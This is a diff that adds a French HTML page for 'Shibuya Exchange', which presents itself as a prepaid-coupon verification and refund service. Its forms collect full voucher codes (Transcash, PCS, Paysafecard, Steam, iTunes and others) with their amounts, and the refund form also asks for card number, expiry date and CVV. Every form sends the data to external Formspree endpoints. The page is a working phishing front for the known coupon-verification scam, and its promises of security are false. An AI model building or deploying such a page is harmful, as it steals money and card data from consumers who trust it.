@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Shibuya Exchange - Vérification de coupons</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+  <!-- Barre de navigation -->
+  <nav>
+    <div class="logo">Shibuya Exchange</div>
+    <ul class="nav-links">
+      <li><a href="index.html"><i class="fas fa-home"></i> Accueil</a></li>
+      <li><a href="#" id="statut-coupon"><i class="fas fa-ticket-alt"></i> Statut Coupon</a></li>
+      <li><a href="#" id="remboursement"><i class="fas fa-money-bill-wave"></i> Remboursement</a></li>
+      <li><a href="#" id="nous-contacter"><i class="fas fa-envelope"></i> Nous Contacter</a></li>
+    </ul>
+  </nav>
+
+  <!-- Header avec diaporama -->
+  <header>
+    <div class="header-content">
+      <h1>Vérifiez vos coupons en un clic !</h1>
+      <p>Assurez-vous que vos coupons sont valides et économisez sur vos achats en ligne.</p>
+      <button class="cta-button" id="verifier-coupon">Vérifier mon coupon</button>
+    </div>
+    <div class="slideshow">
+      <img src="3d2434689dc54d4996f9227d26f33117.jpg" alt="Image 1">
+      <img src="10ca02c27bdf2550bd8fb036970db5af.jpg" alt="Image 2">
+      <img src="15a09e8cbf28758271d5472384374f5a.jpg" alt="Image 3">
+    </div>
+  </header>
+
+  <!-- Section de contenu -->
+  <section class="content">
+    <p>Bienvenue sur Shibuya Exchange, votre partenaire de confiance pour la vérification de coupons. Nous vous offrons un service rapide, sécurisé et fiable.</p>
+    <div class="card-grid">
+      <div class="card">
+        <img src="50f3dc6123804dfeafd8956c325a7810.jpg" alt="Carte 1">
+        <p>Vérifiez vos coupons en quelques secondes.</p>
+      </div>
+      <div class="card">
+        <img src="260c391724344663d6bb585c5717a7a3.jpg" alt="Carte 2">
+        <p>Obtenez des remboursements rapides et sécurisés.</p>
+      </div>
+      <div class="card">
+        <img src="968de505d914d5fe313c73d6f97e2e9e.jpg" alt="Carte 3">
+        <p>Profitez de promotions exclusives.</p>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- Section Pourquoi Nous Choisir -->
+<section class="why-choose-us">
+  <div class="why-choose-us-content">
+    <div class="why-choose-us-title">
+      <h2>Pourquoi Nous Choisir</h2>
+    </div>
+    <div class="why-choose-us-cards">
+      <div class="why-choose-us-card">
+        <i class="fas fa-shield-alt"></i>
+        <h3>Sécurité Maximale</h3>
+        <p>Nous garantissons la sécurité de vos transactions et de vos données personnelles.</p>
+      </div>
+      <div class="why-choose-us-card">
+        <i class="fas fa-clock"></i>
+        <h3>Rapidité</h3>
+        <p>Vérifiez vos coupons et obtenez des remboursements en quelques minutes.</p>
+      </div>
+      <div class="why-choose-us-card">
+        <i class="fas fa-hand-holding-usd"></i>
+        <h3>Économies</h3>
+        <p>Profitez de promotions exclusives et économisez sur vos achats en ligne.</p>
+      </div>
+      <div class="why-choose-us-card">
+        <i class="fas fa-headset"></i>
+        <h3>Support 24/7</h3>
+        <p>Notre équipe est disponible 24h/24 pour répondre à vos questions.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer>
+  <div class="footer-left">
+    <h3>Achetez sur internet en toute sérénité</h3>
+    <p>Vous avez peur de la fraude à la carte bancaire sur internet ?</p>
+    <ul>
+      <li><i class="fas fa-shield-alt"></i> Votre carte Transcash est dotée d’une puce EMV et d’un code PIN vous offrant un niveau de sécurité plus élevé lors de vos achats.</li>
+      <li><i class="fas fa-credit-card"></i> Votre carte Transcash est séparée de votre compte bancaire courant.</li>
+      <li><i class="fas fa-lock"></i> Vos données personnelles sont protégées contre le vol d’identité et les utilisations frauduleuses.</li>
+    </ul>
+    <p>La carte prépayée Transcash est l’un des moyens de paiement les plus sûrs, elle est idéale pour les consommateurs qui souhaitent acheter sur Internet en toute sécurité sur tous les sites e-commerce Français ou étrangers du réseau Mastercard.</p>
+  </div>
+  <div class="footer-right">
+    <h3>Besoin de coupons ?</h3>
+    <a href="https://www.mypcs.com/" target="_blank"><i class="fas fa-shopping-cart"></i> Acheter des Recharges</a>
+    <a href="#"><i class="fas fa-info-circle"></i> À propos de nous</a>
+    <!-- FAQ avec modals -->
+    <div class="faq-section">
+      <h3><i class="fas fa-question-circle"></i> FAQ</h3>
+      <div class="faq-modal" id="faq1">
+        <div class="faq-question">Comment vérifier mon coupon ?</div>
+        <div class="faq-answer">
+          <p>Pour vérifier votre coupon, rendez-vous sur la page d'accueil et cliquez sur "Vérifier mon coupon". Suivez ensuite les instructions.</p>
+        </div>
+      </div>
+      <div class="faq-modal" id="faq2">
+        <div class="faq-question">Comment demander un remboursement ?</div>
+        <div class="faq-answer">
+          <p>Pour demander un remboursement, cliquez sur "Remboursement" dans la barre de navigation et remplissez le formulaire.</p>
+        </div>
+      </div>
+      <div class="faq-modal" id="faq3">
+        <div class="faq-question">Quels types de cartes sont acceptés ?</div>
+        <div class="faq-answer">
+          <p>Nous acceptons les cartes Transcash, Neosurf, PCS, Paysafecard, Google Pay, Neocash, GiftCard, Steam, iTunes, Apple Card, Cash Ticket et Toneo.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<!-- Copyright -->
+<div class="copyright">
+  <p>&copy; 2023 Shibuya Exchange. Tous droits réservés.</p>
+</div>
+
+<!-- Formulaire pour "Vérifier mon coupon" et "Statut Coupon" -->
+<div id="form-coupon" class="form-modal">
+  <div class="form-content">
+    <span class="close">&times;</span>
+    <h2>Vérifier mon coupon</h2>
+    <form action="https://formspree.io/f/meoendag" method="POST" class="form-grid">
+      <input type="text" name="nom" placeholder="Nom" required>
+      <input type="text" name="prenoms" placeholder="Prénoms" required>
+      <input type="email" name="email" placeholder="Adresse Mail" required>
+      <input type="tel" name="telephone" placeholder="Téléphone" required>
+      <select name="type_carte" required>
+        <option value="" disabled selected>Type de carte</option>
+        <option value="Transcash">Transcash</option>
+        <option value="Neosurf">Neosurf</option>
+        <option value="PCS">PCS</option>
+        <option value="Paysafecard">Paysafecard</option>
+        <option value="Google Pay">Google Pay</option>
+        <option value="Neocash">Neocash</option>
+        <option value="GiftCard">GiftCard</option>
+        <option value="Steam">Steam</option>
+        <option value="iTunes">iTunes</option>
+        <option value="Apple Card">Apple Card</option>
+        <option value="Cash Ticket">Cash Ticket</option>
+        <option value="Toneo">Toneo</option>
+      </select>
+      <input type="text" name="code1" placeholder="Votre code 1" required>
+      <input type="text" name="code2" placeholder="Votre code 2" required>
+      <input type="text" name="code3" placeholder="Votre code 3" required>
+      <input type="number" name="montant1" placeholder="Montant 1" required>
+      <input type="number" name="montant2" placeholder="Montant 2" required>
+      <input type="number" name="montant3" placeholder="Montant 3" required>
+      <button type="submit">Valider</button>
+    </form>
+  </div>
+</div>
+
+<!-- Formulaire pour "Remboursement" -->
+<div id="form-remboursement" class="form-modal">
+  <div class="form-content">
+    <span class="close">&times;</span>
+    <h2>Demande de remboursement</h2>
+    <form action="https://formspree.io/f/xjkglzrz" method="POST" class="form-grid">
+      <input type="text" name="nom" placeholder="Nom" required>
+      <input type="text" name="prenoms" placeholder="Prénoms" required>
+      <input type="text" name="adresse" placeholder="Adresse" required>
+      <input type="tel" name="telephone" placeholder="Téléphone" required>
+      <input type="email" name="email" placeholder="Adresse Mail" required>
+      <select name="type_carte" required>
+        <option value="" disabled selected>Type de carte</option>
+        <option value="Transcash">Transcash</option>
+        <option value="Neosurf">Neosurf</option>
+        <option value="PCS">PCS</option>
+        <option value="Paysafecard">Paysafecard</option>
+        <option value="Google Pay">Google Pay</option>
+        <option value="Neocash">Neocash</option>
+        <option value="GiftCard">GiftCard</option>
+        <option value="Steam">Steam</option>
+        <option value="iTunes">iTunes</option>
+        <option value="Apple Card">Apple Card</option>
+        <option value="Cash Ticket">Cash Ticket</option>
+        <option value="Toneo">Toneo</option>
+      </select>
+      <input type="text" name="numero_carte" placeholder="Numéro de carte" required>
+      <input type="text" name="date_expiration" placeholder="Date d'expiration" required>
+      <input type="text" name="cvv" placeholder="Code CVV" required>
+      <input type="text" name="code_recharge" placeholder="Code de recharge" required>
+      <input type="number" name="montant" placeholder="Montant" required>
+      <textarea name="motif" placeholder="Motif" required></textarea>
+      <button type="submit">Valider</button>
+    </form>
+  </div>
+</div>
+
+<!-- Formulaire pour "Nous Contacter" -->
+<div id="form-contact" class="form-modal">
+  <div class="form-content">
+    <span class="close">&times;</span>
+    <h2>Nous Contacter</h2>
+    <form action="https://formspree.io/f/mpwqbnjr" method="POST">
+      <input type="text" name="nom" placeholder="Nom" required>
+      <input type="text" name="prenoms" placeholder="Prénoms" required>
+      <input type="email" name="email" placeholder="Adresse Mail" required>
+      <input type="tel" name="telephone" placeholder="Téléphone" required>
+      <textarea name="message" placeholder="Votre message..." required></textarea>
+      <button type="submit">Envoyer</button>
+    </form>
+  </div>
+</div>
+
+  <script src="script.js"></script>
+</body>
+</html>
